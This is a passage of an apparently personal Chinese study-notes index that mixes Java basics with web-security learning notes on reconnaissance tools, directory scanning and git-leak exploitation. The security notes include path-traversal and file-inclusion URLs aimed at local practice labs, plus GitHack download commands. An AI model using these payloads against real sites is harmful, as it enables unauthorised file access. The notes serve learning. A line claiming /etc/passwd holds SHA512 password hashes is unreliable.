}\n}\n```\noutput\n```cmd\n主人喂养宠物实例：\n蔡徐坤\n\n蔡徐坤开始喂宠物：\n宠物吃东西\n\n蔡徐坤开始喂狗：旺财\n狗儿啃骨头\n\n蔡徐坤开始喂猫：汤姆\n猫儿吃鱼\nPig对象\n佩奇猪在睡觉\n乔治猪在睡觉\n```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/08-%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E":{"title":"08-网络空间搜索引擎","content":"\n\n- # 基础\n- 输入OSINT ：open source intelligence 开源网络情报\n- 前面的搜索更多的是针对于网络网页的内容，而网络空间不仅仅是对于网页内容的搜索，更多的是对于网络**硬件**和网络**系统**的内容。\n- 比如服务器、打印机、手机、终端、网站等等的搜索\n- 扫描的[[软件工具]]：zmap、nmap\n\t-\n- 扫描方式：\n  1. ip库\n  2. 枚举\n- 怎么标识一个设备?\n\t- 1. ip或者域名 url\n\t  2. 开放的端口\n\t  3. 操作系统\n\t  4. 物理地址mac\n\t  5. 设备的类型\n\t\t-\n- 实时威胁地图：\n  1. https://threatmap.checkpoint.com/\n  2. 卡巴斯基 https://cybermap.kaspersky.com/cn\n\t-\n- ## 网络空间搜索引擎\n- ### SHODAN 搜索引擎\n- [shodan.io](https://www.shodan.io/)\n- 搜索语法文档：https://www.shodan.io/dashboard\n- eg ![image.png](https://tc3.doingnothing.online/assets/image_1678784542529_0.png)\n-\n- ### 其他网络空间搜索引擎\n- 1. [Censys](https://censys.io/):还收录了证书\n  2. [ZoomEye](https://www.zoomeye.org)：网络空间测绘\n  3. [fofa](https://fofa.info/)\n\t-\n- [[软件工具]]\n- 1. 知道创宇推出的 [kunyu](https://github.com/knownsec/Kunyu)，主要收集资产\n  3. https://github.com/coco413/DiscoverTarget\n  4. https://github.com/saucer-man/saucerframe\n\t-","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/08-xss%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95":{"title":"08-xss防御方法","content":"\n\n- 过滤输入：对用户输入的东西进行正则判断，过滤掉xss的语句等等\n- 处理输出：对已经输入的东西进行判断，是否含有xss脚本\n- WAF：使用waf，不论是硬件waf还是软件waf，都有大量的过滤以及防御措施。","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/081_%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96":{"title":"081_静态方法不存在方法覆盖","content":"# 081_静态方法不存在方法覆盖\n\n对象之间，有了继承之后，才有方法的覆盖和多态。\n方法覆盖只是针对于“实例方法”，“静态方法”没有方法意义，因为其与对象无关，只和类有关。\n\ncode\n```java\npackage a008遗留问题;\n\nimport a007方法覆盖和多态.Cat;\n\npublic class 静态方法and方法覆盖 {\n    public static void main(String[] args) {\n\n        // 直接调用dosome方法\n        Animal.doSome();\n        Cat.doSome();\n        // 建立对象之后调用dosome方法\n        System.out.println(\"========\");\n        Animal a1=new Animal();\n        a1.doSome();\n\n        Cat c1=new Cat();\n        c1.doSome();\n    }\n}\n\nclass Animal{\n    public static void doSome(){\n        System.out.println(\"animal 的dosome方法\");\n    }\n}\nclass Cat extends Animal{\n    // 尝试在子类中对父类的静态方法重写\n    public static void doSome(){\n        System.out.println(\"Cat 的dosome方法\");\n    }\n}\n````\noutput![](../../../../assets/Pasted%20image%2020220708221554.png)\n\n不论是通过实例调用，还是通过类调用，都与对象无关，实际都是通过类去进行调用的。\n\n**方法覆盖不能和多态分开**","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/082_%E7%A7%81%E6%9C%89%E6%96%B9%E6%B3%95%E6%97%A0%E6%B3%95%E8%A6%86%E7%9B%96":{"title":"082_私有方法无法覆盖","content":"# 082_私有方法无法覆盖\n\n```java\npackage a008遗留问题;\n\n  \n\npublic class A {\n\n  \n\n    private void do(){\n\n        System.out.println(\"public类的do方法\");\n\n    }\n\n    public static void main(String[] args) {\n\n        A a1 = new T();\n\n        a1.do();\n\n    }\n\n}\n\nclass T extends A{\n\n    public void do(){\n\n        System.out.println(\"T的do方法\");\n\n    }\n\n}\n```\n抱歉，运行不出来，打扰了\n![](../../../../assets/Pasted%20image%2020220708223626.png)\n在写就不礼貌了","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/083_%E5%85%B3%E4%BA%8E%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E6%97%B6%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B":{"title":"083_关于方法覆盖时的返回值类型","content":"# 083_关于方法覆盖时的返回值类型\n\n```java\n\npublic class OverrideTest07{\n\tpublic static void main(String[] args){\n\t\t// 一般重写的时候都是复制粘贴。不要动。不要改。\t\n\t}\n}\n\nclass Animal{\n\t/*\n\tpublic double sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n\t\n\t/*\n\tpublic long sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n\n\t/*\n\tpublic int sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n}\n\nclass Cat extends Animal{\n\t// 重写\n\t// 错误: Cat中的sum(int,int)无法覆盖Animal中的sum(int,int)\n\t/*\n\tpublic int sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n\t\n\t/*\n\tpublic double sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n\n\t//错误: Cat中的sum(int,int)无法覆盖Animal中的sum(int,int)\n\t/*\n\tpublic long sum(int a, int b){\n\t\treturn a + b;\n\t}\n\t*/\n}\n\n// 父类\nclass MyClass1{\n\t\n\tpublic Animal getAnimal(){\n\t\treturn null;\n\t}\n}\n\n// 子类\nclass MyClass2 extends MyClass1{\n\n\t// 重写父类的方法\n\t/*\n\tpublic Animal getAnimal(){\n\t\treturn null;\n\t}\n\t*/\n\n\t// 重写的时候返回值类型由Animal变成了Cat，变小了。（可以，java中允许）\n\t/*\n\tpublic Cat getAnimal(){\n\t\treturn null;\n\t}\n\t*/\n\n\t// 重写的时候返回值类型由Animal变成了Object。变大了。（不行，java中不允许）\n\t/*\n\tpublic Object getAnimal(){\n\t\treturn null;\n\t}\n\t*/\n}\n```\n\n结论：学习了多态之后你会发现\n方法覆盖的返回值类型在基本数据类型必须一样，而在引用类型中（就是你class的那些类的对象），可以是你class的子类树上的类","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/09-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF":{"title":"09-目录扫描收集信息","content":"\n# st.10 目录扫描收集信息\n\n目录扫描可以扫描到网站的一些文件目录结构，通过目录中的文件来获取一些信息。 部署的网站的一些敏感信息 1. 配置文件：`.cfg`\n\n1. 数据文件：`.sql`,`.tar.gz`\n2. 目录：`/backup`,`/conf`,`/admin` 可能会泄露的信息：\n3. 数据库用户名和密码\n4. 服务器的用户名和密码\n5. 网站源码\n6. 数据库的文件\n7. 一些特殊有用的配置文件\n\n泄露的原因：配置不当\n\n1. 本地文件包含：\n1. local file inclusion（LFI）\n2. PHP 1. `header.php` 2. `common.php` 3. `footer.php` 4. `function.php`\n3. include(“路径/文件”):`include(\"../../..\")`\n4. require();\n5. dvwa靶场 1. `http://localhost/dvwa/vulnerabilities/fi/? page=../../phpinfo.php` 2. `http://localhost/dvwa/vulnerabilities/fi/?page=../../../../../../../in.txt`\n## 常见的敏感目录和文件\n\n1. robots.txt:禁止搜索引擎爬虫爬的文件\n2. sitemap.xml ：指导搜索引擎爬哪些内容或者目录的一个文件\n3. 网站的备份文件/数据\n1. 在线压缩\n    1. 路径\n    2. 文件名\n    3. wwwroot –20210212.zio\n2. 帝国备份王：比如1.sql，1.zip，不仅能够备份文件，还能够备份数据\n4. 后台登录的目录\n1. /admin\n2. /manage\n5. 安装包（源码）：非开源，商用的，里面可能有默认的一些9配置，比如密码之类的，可以利用\n6. 上传的目录\n1. 文件上传漏洞,如web shell\n2. /upload\n3. /upload.php\n7. mysql的管理界面\n1. MySQL\n2. web页面去管理\n3. phpadmin-密码爆破-webshell：主要是一些虚拟主机，不会给一个数据库，而是给一个数据库的web管理页面，同时没有一些登录验证，可以密码爆破等等方式进行破解\n8. 程序的安装路径 ：/install\n9. php的探针\n1. phpinfo\n2. 雅黑探针\n10. 文本编辑器：这里说的文本编辑器，指的是富文本编辑器有一些漏洞存在，比如**文件上传**，**命令注入**\n1. Ueditor：https://github.com/fex-team/ueditor\n2. kindeditor\n3. CKeditor\n11. Linux\n1. /etc/passwd ：用于存放**用户以及用户组**等等相关信息\n2. /etc/passwd ：存放了用户密码，使用**SHA512**加密，一些常规的密码可以在网上找到逆向解密工具\n3. /etc/sudoers ：sudo，存放了**可以使用sudo命令的用户**\n12. MacOS\n1. .DS_Store：存放了一些配置文件，可以获取到一些敏感文件的文件名、目录结构等等\n13. 编辑器的临时文件.swp：linux中就有，可能会有之前临时中断编辑的文件，可能会存在一些敏感内容\n14. 目录穿越/目录遍历\n1. Windows IIS\n2. Apache\n3. pikachu靶场\n    1. http://localhost/pikachu/vul/dir/dir_list.php?title=jarheads.php\n    2. http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../Windows/win.ini\n15. tomcat WEB-INF：这个一般javaweb或者java项目会有\n1. WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.\n2. WEB-INF/database.properties : 数据库配置文件\n3. WEB-INF/classes/ : 一般用来存放Java类文件(.class)\n4. WEB-INF/lib/ : 用来存放打包好的库(.jar)\n5. WEB-INF/src/ : 用来放源代码(.asp和.php等)\n16. 其他非常规文件：主要值得是一些用户可能会了方便自己，存的一些敏感文件\n1. secret.txt\n2. password.txt\n## 文件扫描思路\n\n```\n1. 做法：直接在域名后面拼接路径/文件名，如果返回200，就是存在\n2. 扫描方法：\n1. 递归：dir xxx\n2. 字典：dict\n3. 暴力破解：字符串挨着试\n4. 爬虫\n    1. robots.txt\n    2. sitemap.xml\n    3. 网页中的其他链接\n5. fuzz（模糊测试）\n    1. 字典\n        1. /word\n        2. /index.php?word=\n3. 文件扫描的字典\n1. kali：wordlists命令可以查看字典\n2. dirb ：/usr/share/wordlists/dirb/common.txt\n4. 工具\n1. dirb\n2. dirbuster\n3. 御剑\n4. Burp Suite\n    1. Intruder--payload\n    2. www.baidu.com/$bbs$\n5. DirBrute\n6. Dirsearch\n7. Dirmap\n8. wfuzz\n5. 注意事项 :WAF、IDS,可能会防止你扫描，可以使用 **代理、网络空间搜索引擎**解决\n6. 防御\n1. 设置权限\n2. 删除敏感文件\n3. WAF、IDS来检测和过滤等等\n```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/091_suepr%E5%85%B3%E9%94%AE%E5%AD%97":{"title":"091_suepr关键字","content":"# 091_suepr关键字\n\n\n## 重要的结论：\n当一个构造方法第一行：既没有this()又没有super()的话，**默认会有一个super()**;表示通过当前子类的构造方法调用父类的无参数构造方法。所以**必须保证父类的无参数构造方法是存在的**。\n## super和this\n1. this() 通过当前的构造方法去调用“本类”中其它的构造方法\n2. super() **通过当前的构造方法去调用“父类”中的构造方法**（*相当于把父类的构造方法代码部分复制过来*），目的是：创建子类对象的时候，先初始化父类型特征，**父类的构造方法是一定会执行的**,所以**object的构造方法一定会执行**\n3. **由于this和super都只能出现在构造方法第一行，所以不能同时出现在一个构造方法中**\n4. 都能出现在**实例方法**和**构造方法**中。\n2. **不能使用在静态方法中**。\n3. 目的都是：代码复用。\n4. `super`后面必须跟`.`，和this不同，super不保存内存地址，只是表示了父对象的一部分特征，this可以直接打印输出内存地址，而super不行，必须`super.xxxx`的方式使用，或者`super()`的方式使用。\n\n\u003e[!super()]\n\u003e表示通过子类的构造方法调用父类的构造方法。\n\u003e模拟现实世界中的这种场景：要想有儿子，需要先有父亲。\n\u003e父类的构造方法一定是会执行的\t\t\n\t\n## 注意：\n```java\npackage a009Super;\n\npublic class Super01 {\n    public static void main(String[] args) {\n        new B();\n    }\n}\nclass A {    //当没有extends时，默认继承超父类Object类,你也可以写上\n    public  A(){//A的无参数构造\n        super(); //默认有这行，因为有默认的继承对象extends，当你不写构造方法，那么就默认使用父类的无参数构造\n        System.out.println(\"A的无参数构造\"+this.hashCode());\n    }\n    public A(int i){\n        super();//默认也是有这行的\n        System.out.println(\"A的int有参构造\");\n    }\n}\nclass B extends A{\n    /*\n    public B(){\n\t\tsuper();\n\t\tSystem.out.println(\"B类的无参数构造方法！\");\n\t}\n\t*/\n\n\tpublic B(){\n\t\tthis(\"zhangsan\");\n\t\t// 调用父类中有参数的构造方法\n\t\t//super(123);\n\t\tSystem.out.println(\"B类的无参数构造方法！\");\n\t}\n\n\tpublic B(String name){\n\t\tsuper();\n\t\tSystem.out.println(\"B类的有参数构造方法(String)\"+this.hashCode());\n\t}\n\n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220709095747.png]]\n\n\u003e[!分析]\n\u003e1. 当一个类不指定继承关系时，默认继承超父类Object类，\n\u003e2. 在子类构造方法中，如果不书写构造方法，都默认有super()，表示通过子类构造方法调用父类的构造方法\n\u003e3. 当调用子类的构造方法时，默认先使用父类的构造方法，所谓“有子先有父”","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/092_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F":{"title":"092_构造方法执行顺序","content":"# 092_构造方法执行顺序\n\n```java\n/*\n\t判断程序的输出结果\n\t1\n\t3\n\t6\n\t5\n\t4\n\n\t在java语言中不管是是new什么对象，最后老祖宗的Object类的无参数构造方法\n\t一定会执行。（Object类的无参数构造方法是处于“栈顶部”）\n\n\t栈顶的特点：\n\t\t最后调用，但是最先执行结束。\n\t\t后进先出原则。\n\t\n\t大家要注意：\n\t\t以后写代码的时候，一个类的无参数构造方法还是建议大家手动的写出来。\n\t\t如果无参数构造方法丢失的话，可能会影响到“子类对象的构建”。\n\n*/\npublic class SuperTest02{\n\tpublic static void main(String[] args){\n\t\tnew C();\n\n\t}\n}\n\n/*\nclass Object{\n\tpublic Object(){\t\n\t}\n}\n*/\n\nclass A extends Object{\n\tstatic{\n\t\tSystem.out.println(\"A类加载\");\n\t}\n\n\t\n\t{\n\t\tSystem.out.println(\"A 的对象\");\n\t}\n\tpublic A(){\n\t\tSystem.out.println(\"1\"); //1\n\t}\n}\n\nclass B extends A{\n\n\tstatic{\n\t\tSystem.out.println(\"B类加载\");\n\t}\n\n\t{\n\t\tSystem.out.println(\"B 的对象\");\n\t}\n\tpublic B(){\n\t\tSystem.out.println(\"2\"); //2\n\t}\n\tpublic B(String name){\n\t\tsuper();\n\t\tSystem.out.println(\"3\"); // 3\n\t}\n}\n\nclass C extends B{\n\tstatic{\n\t\tSystem.out.println(\"C类加载\");\n\t}\n\t{\n\t\tSystem.out.println(\"c 的对象\");\n\t}\n\tpublic C(){ // 这个是最先调用的。但是最后结束。\n\t\tthis(\"zhangsan\");\n\t\tSystem.out.println(\"4\");//4\n\t}\n\tpublic C(String name){\n\t\tthis(name, 20);\n\t\tSystem.out.println(\"5\");//5\n\t}\n\tpublic C(String name, int age){\n\t\tsuper(name);\n\t\tSystem.out.println(\"6\");//6\n\t}\n}\n```\noutput\n\n![[../../../../assets/Pasted image 20220709104223.png]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/093_%E4%BD%BF%E7%94%A8super%E8%B0%83%E7%94%A8%E7%88%B6%E7%B1%BB%E6%96%B9%E6%B3%95":{"title":"093_使用super调用父类方法","content":"# 093_使用super调用父类方法\n\nsuper不仅可以调用父类的属性，还可以调用父类的方法。\n\nsuper.属性名\t\t\t  访问父类的属性\nsuper.方法名(实参)\t访问父类的方法\nsuper(实参)\t\t\t    调用父类的构造方法\n\n## eg\n```java\n/*\n\t判断程序的输出结果\n\t1\n\t3\n\t6\n\t5\n\t4\n\n\t在java语言中不管是是new什么对象，最后老祖宗的Object类的无参数构造方法\n\t一定会执行。（Object类的无参数构造方法是处于“栈顶部”）\n\n\t栈顶的特点：\n\t\t最后调用，但是最先执行结束。\n\t\t后进先出原则。\n\t\n\t大家要注意：\n\t\t以后写代码的时候，一个类的无参数构造方法还是建议大家手动的写出来。\n\t\t如果无参数构造方法丢失的话，可能会影响到“子类对象的构建”。\n\n*/\npublic class SuperTest02{\n\tpublic static void main(String[] args){\n\t\tnew C();\n\n\t}\n}\n\n\tpublic static void main(String[] args){\n\t\t/*\n\t\t\tCat move!\n\t\t\tCat move!\n\t\t\tAnimal move!\n\t\t*/\n\t\tCat c = new Cat();\n\t\tc.yiDong();\n\t}\n}\n\nclass Animal{\n\tpublic void move(){\n\t\tSystem.out.println(\"Animal move!\");\n\t}\n}\n\nclass Cat extends Animal{\n\t// 对move进行重写。\n\tpublic void move(){\n\t\tSystem.out.println(\"Cat move!\");\n\t}\n\n\t// 单独编写一个子类特有的方法。\n\tpublic void yiDong(){\n\t\tthis.move();\n\t\tmove();\n\t\t// super. 不仅可以访问属性，也可以访问方法。\n\t\tsuper.move();\n\t}\n}\n```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/10-git%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86":{"title":"10-git信息收集","content":"\n- 集中化的VCS：Centralized Version Control Systems：CVCS\n- SVN\n- CVS\n- 去中心化的CVS：Distributed Version Control System–DVCS\n- Github、Gitlab、码云\n- Git —Linus Torwalds\n-\n- #question 为什么git会导致信息泄露？\n\t- 把私有仓库/隐私文件提交到了github\n\t- 部署项目的时候，不小心把 .git 文件一起打包进\n\t- git/logs/HEAD ：存储了git的log信息，可以找到历史的commit项\n\t- .git/index ：缓存git add的文件，暂存区\n\t- .git/refs/stash 通过git stash ：把代码存入缓存区\n\t- .git/refs/heads/master ：记录了master的commit的hash\n-\n- [[github]]搜索的技巧:\n\t- 高级搜索：https://github.com/search/advanced?\n\t- `kali in:file`  搜索文件中包含kali的代码\n\t- `kali in:path` 搜索路径中包含kali的代码\n\t- `kali in:path,file` 搜索路径、文件中包含kali的代码\n\t- `shodan language:python` 搜索关键字shodan，语言为python的代码\n\t- `filename:config.php language:php` 搜索文件名为config.php，且语言为php\n\t- `kali topics:\u003e=5` 标签数量大于等于5的\n\t- `kali size:\u003c1000`  文件小于1KB的\n\t- `kali stars:10..50` star大于10小于50的\n\t- `kali pushed:\u003e2021-08-15` 搜索在2021年8月15日之后提交的\n\t- `kali pushed:2021-07-01..2021-08-01` 搜索在此区间\n\t- `kali created:\u003e=2021-06-01` 创建时间\n\t- `kali pushed:\u003c2021-08-01 -language:java` 搜索在2020年8月1日前push代码且排除java语\n\t  言\n- git信息泄露利用的方式：\n\t- 找到.git\n\t\t- 目录扫描\n\t\t- robots.txt\n\t\t- 搜索引擎搜索--\u003eintitle:\"Index of /.git\"\n\t- 把.git下载到本地\n\t\t- https://github.com/BugScanTeam/GitHack --\u003e `python GitHack.py xxx.com/.git/`\n\t\t- https://github.com/lijiejie/GitHack\n\t\t- https://github.com/wangyihang/githacker\n\t\t- https://github.com/WangWen-Albert/JGitHack\n\t- 用git的命令获取内容\n\t\t- `git log`获取提交记录\n\t\t- `git reset --hard [log hash]` 恢复到某个版本\n\t\t- `git diff` 对比版本差异\n\t- 工具  https://github.com/gakki429/Git_Extract\n-\n- 案例\n\t- ctfhub技能树\n\t\t- Web——信息泄露——Git泄露——Log、Stash、\n\t\t  Index\n\t- buuctf\n\t\t- 禁止套娃\n\t\t- Mark loves cat","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/101_%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93":{"title":"101_学习总结","content":"#Java基础 \n\n## 前序\n通过大致17天的学习，学习了javase的基础，让我对java的一些基本特点或者使用有了轮廓。\n接下来将要学习java进阶，所以就目前的学习做一下总结。\n## 一、理论\n在理论方面学习了\n1. java开发工具包JDK，包括了JREJava运行环境（包括了JVM虚拟机）\n2. 学习了java程序的执行过程：源代码执行，生成字节码，JVM解释为二进制文件，交给操作系统，操作系统与硬件进行交互\n3. 基本的环境变量设置：`sysdm.cpl`\n4. 三种注释方法\n5. `public class`和`class`的区别：一个文件最多一个public class，但可以有无数个class，public的class必须和文件名一致\n\n---\n## 二、铺垫\n1. 变量名定义：驼峰命名；基本的关键字50个\n2. javadoc的基本使用：需要配合文档注释\n3. 不同数据类型所占用的字节大小：1248 4812 （byte short int long；float double boolean char）\n4. Scanner的使用，基本的导包方式（和那个python好像一样）\n5. 方法的调用：在一个类中，可以直接写想要调用的方法，如果不在一个类中，则采用：`类名.方法`\n6. break和return的区别：return可以后面不跟返回值，用来停止一个方法\n7. JVM的三个主要内存：堆 栈 方法区的基本分配，一个程序运行时在内存JVM中的情况\n8. 方法重载overload：在一个类中，书写的某个方法可能有多重变化，可以定义多个**参数列表不同**，方法名称相同的方法，就叫方法重载。（参数列表指的形参列表），在使用的时候，java会根据你的形参列表去判断执行哪一个具体的方法\n---\n## 三、基本\n1. 递归：能转成循环就转成循环，耗内存。写递归嘴重要的是知道停止条件。通过调用自身去解决问题\n2. 面向对象和面向过程的特点和区别：java面向对象，耦合度低，扩展性强\n3. 对象和类的关系：通过类去实例化对象。如何去定义类，如何去实例化对象new\n4. 实例化对象，对对象进行赋值和修改\n5. 什么时候会出现空指针异常`java.lang.NullPointerException`，将实例化对象的那个引用置空，那么那个对象就引用任何东西了，对象所存储的东西就处于游离状态。访问引用对象的属性时就会出现空指针异常\n6. 方法调用时的参数传递，实参和形参以及局部变量的释放\n\n---\n## 四、构造方法\n1. 构造方法语法格式：`public 类名{}`\n2. 构造方法的注意事项：手动提供有参构造之后，无参构造就不再提供，所以必须要**记得把无参构造写上**，除非你不用无参构造\n3. 无参数和有参数的构造方法及其使用:蔡徐坤打篮球\n\n---\n## 五、封装\n1. 封装的作用：保证内部安全，屏蔽复杂，暴露简单。\n2. 基本语法：就是get和set对内部数据进行获取和修改\n3. get和set应该也是实例方法，因为需要依赖实例对象\n4. 通俗的解释：封装就是，把数据转换成一个工具。你可以通过这个工具进行修改，工具使用起来很简单，客户方便使用；而我可以通过这个工具，把里面有的不想给你看到的，不想让你有修改权利的东西给藏住不让你用，不让你看。\n\n---\n## 六、this 和 static关键字\n1. 静态代码块：类加载时机\n2. 实例代码块：对象创建时机\n3. static声明之后存在方法区，类加载时就加载static定义的东西\n4. 静态方法和实例方法：实例方法依赖于实例对象，用对象.的方式调用；而静态方法加载在方法区，用类.的方法调用\n5. 即使将对象置空，引用静态变量，依旧不会出现空指针异常，因为静态变量不依赖于对象的建立\n6. 不同代码块的执行顺序：最先加载类\n7. this的内存结构:放在堆内存中\n8. this();\n9. 各种变量在内存中的分布：局部变量（栈），静态变量（方法区），实例变量（堆）\n---\n## 七、继承\n1. **除了构造方法，其余的子类都继承，包括实例方法和get set方法都可以继承**\n2. 主要作用：有了继承关系，才有后续的方法覆盖和多态\n3. **java中只支持单继承**\n4. 在进行重新构造子类构造器的时候，可以通过super关键字快速完成\n5. 凡是可以用“is a”来描述的，都可以考虑采用继承\n---\n## 八、方法覆盖和多态\n1. 当继承的方法无法满足当前子类的业务需求，子类有权利对这个方法进行重新编写，进行方法覆盖override\n2. 私有方法、构造方法、静态方法无法覆盖，方法覆盖针对实例方法\n3. java程序在 编译阶段 和执行阶段 所真正参与的是不同的对象，所以叫多态。\n4. Java中允许向上向下转型\n5. 当你访问的是一个**子类对象中所“特有”的方法**，此时必须**向下转型**，使用强制转型方法 \n6. 强制类型转型的风险是`java.lang.ClassCastException` （类型转换错误），原因是强制类型转换的两个类没有父子类型继承关系，可以通过if和instanceof关键字解决\n7. 学习采用抽象编程，而不是具体编程：主人养宠物\n---\n\n## 九、super关键字\n1. this与super都是与对象有关，常常在构造方法或者实例方法中使用\n2. super后面必须跟`.`，因为他不是引用，不保存内存地址，而this可以直接使用\n3. 当一个构造方法没有this和super的时候，第一行默认是有`super();`的，表示通过子类的构造方法调用父类的无参构造方法\n4. 必须保证父类的无参构造方法是存在的\n5. 构造方法的执行顺序：超父类`Object`类是一定会执行的，因为任何一个类extends类，都默认继承`Object`类\n6. 使用super() 可以调用父类的构造方法，使用super.xxx可以调用父类的属性，使用super.方法名称（实参），可以访问父类的方法\n---\n## 十、遗留问题\n1. 静态方法不存在方法覆盖，没有意义，因为与对象无关\n2. 私有方法无法覆盖\n3. 方法覆盖的返回值类型在基本数据类型必须一样，而在引用类型中（就是你class的那些类的对象），可以是你class的子类树上的类","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/11-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93":{"title":"11-信息收集总结","content":"\n\n- 书籍 https://img.doingnothing.online/wangan/2.12-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93%EF%BC%88%E6%97%A0%E6%B6%AF%EF%BC%89.pdf\n## kail信息收集工具\n\n\n\nkali的软件清单https://tools.kali.org/tools-listing\n\n中文翻译  https://github.com/Jack-Liang/kalitools\n- 存活主机识别\n\t- ​\tarping 将ARP和/或ICMP请求发送到指定的主机\n\t- fping fping可以在命令行中指定要ping的主机数量范围\n\t- hping3\n\t\t- ​\tTCP/IP数据包组装/分析工具\n\t\t- ​\t可以发起flood攻击\n\t- ​\t**masscan**\n\t\t- 最快的互联网端口扫描器\n\t- thcping6\n\t\t- atk6-thcping6\n\t\t- 可以攻击IPV6和ICMP6固有的协议弱点\n- 路由分析\n\t- **netdiscover**\n\t\t- 基于ARP的网络扫描工具\n\t\t- 地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议\n\t- netmask ：netmask可以在 IP范围、子网掩码、cidr、cisco\n\t  \n\t  等格式中互相转换\n- 情报分析\n\t- **maltego**  ：信息收集和网络侦查工具\n\t- spiderfoot ：收集信息和探测资源\n\t- theharvester\n\t\t- 从公开来源收集电子邮件帐户和子域名的工具 --OSINT\n\t\t- theHarvester -d microsoft.com -l 500 -b baidu\n- 网络扫描\n\t- masscan\n\t- **nmap**\n\t\t- 主机发现\n\t\t- 端口扫描服务和版本探测\n\t\t- 操作系统探测\n\t\t- 防火墙/IDS躲避和哄骗\n- DNS分析\n\t- dnsenum   多线程perl脚本枚举域的DNS信息并发现非连续的IP段工具\n\t- dnsrecon\n\t\t- DNS枚举和扫描\n\t\t- dnsrecon -d www.coolshell.cn\n\t- fierce\n\t\t- DNS扫描程序\n\t\t- fierce --domain www.coolshell.cn\n- IDS/IPS识别\n\t- IDS （入侵检测系统） Intrusion Detection Systems\n\t- IPS （入侵防御系统）  Intrusion Prevention System\n\t- **lbd**\n\t\t- load balance detector\n\t\t- CDN、负载均衡识别\n\t\t- lbd www.coolshell.cn\n\t- **wafw00f**\n\t\t- WAF识别\n\t\t- wafw00f www.coolshell.cn\n- SMB分析\n\t- SMB：Server Message Block  网络文件系统协议\n\t- enum4linux\n\t\t- 可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等\n\t\t- enum4linux 192.168.142.1\n\t- nbtscan\n\t\t- 扫描开放的NETBIOS名称服务器\n\t\t- nbtscan -r 192.168.142.0/24\n\t- smbmap\n\t\t- SMBMap允许用户枚举整个域中的samba共享驱动器。 列出共享驱动器，驱动器权限，共享内容，上载/下载功能，文件名自动下载模式匹配，甚至执行远程命令\n\t\t- smbmap -u wuya -p 1234 -H 192.168.142.1\n- SNMP分析\n\t- 简单网络管理协议 :大部分的设备都支持SNMP协议\n\t- onesixtyone\n\t\t- 通过SNMP服务，渗透测试人员可以获取大量的设备和系统信息\n\t\t- onesixtyone 192.168.142.1\n\t- snmp-check\n\t\t- snmp-check 192.168.142.1 -p 161\n- SSL分析\n\t- ssldump  SSL/TLS 网络协议分析工具\n\t- sslh：一款采用 C 语言编写的开源端口复用软件，SSLH 允许我们在 Linux 系统上的同一端口上运行多个程序/服务\n\t- sslscan\n\t\t- 评估远程 Web 服务的 SSL/TLS 的安全性\n\t\t- sslscan www.coolshell.cn\n\t- sslyze\n\t\t- 可以扫描出SSL中一些经典的配置错误\n\t\t- sslyze www.coolshell.cn\n- dmitry\n\t- 信息收集工具\n\t- 子域，电子邮件地址，正常运行时间信息，tcp\n\t- 端口扫描，whois\n\t  \n\t    ike-scan \n\t  \n\t    VPN服务嗅探工具","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/111_Idea%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8":{"title":"111_Idea的基本使用","content":"# 111_Idea的基本使用\n.1. module：模块的创建\n\n## dae的快捷键\n\n| 作用                 | 快捷键                                     |\n| -------------------- | ------------------------------------------ |\n| 新建class            | 选中文件夹 alt +insert（笔记本需要按住fn） |\n| 打开设置set          | ctrl+alt+s                                 |\n| 最大窗口 | ctrl+shift+F12                             |\n| 构造器，get、set方法 | alt+insert                                 |\n| 折叠打开代码块       | alt+←或者→                                 |\n| 切换窗口 | alt + 标号数字 |\n| 提示方法的参数 | ctrl + p |\n| 注释 | 单行注释：ctrl + /\u003cbr/\u003e\t\t多行注释：ctrl + shift + / |\n| 复制一行 | ctrl + d |\n| 删除行               | ctrl +y                                    |\n| 纠错                       | alt+Enter|\n|查看一个类的属性和方法|ctrl + F12|\n|光标停留在红色，**创建方法**| alt 